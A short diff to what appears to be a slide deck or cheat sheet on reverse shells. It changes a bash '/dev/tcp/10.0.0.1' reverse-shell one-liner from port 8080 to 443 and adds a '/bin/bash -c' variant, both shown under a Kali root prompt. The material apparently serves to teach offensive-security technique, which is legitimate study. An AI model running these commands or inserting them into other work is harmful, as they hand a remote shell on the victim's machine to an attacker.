@@ -21,8 +21,15 @@ paginate: true
 ### Bash
 ```bash
 ┌─[root@kali]─[/home/user/demo/exploit]
-└──╼ bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
+└──╼ bash -i >& /dev/tcp/10.0.0.1/443 0>&1
 ```
+
+```bash
+┌─[root@kali]─[/home/user/demo/exploit]
+└──╼ /bin/bash -c 'bash -i >& /dev/tcp/10.0.0.1/443 0<&1'
+```
+
+
 ### Python
 ```bash
 ┌─[root@kali]─[/home/user/demo/exploit]
